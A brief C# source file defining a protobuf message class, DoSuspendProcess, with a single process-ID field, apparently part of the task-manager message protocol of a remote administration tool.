using ProtoBuf;
using Pulsar.Common.Messages.Other;

namespace Pulsar.Common.Messages.Administration.TaskManager
{
    [ProtoContract]
    public class DoSuspendProcess : IMessage
    {
        [ProtoMember(1)]
        public int Pid { get; set; }
    }
}
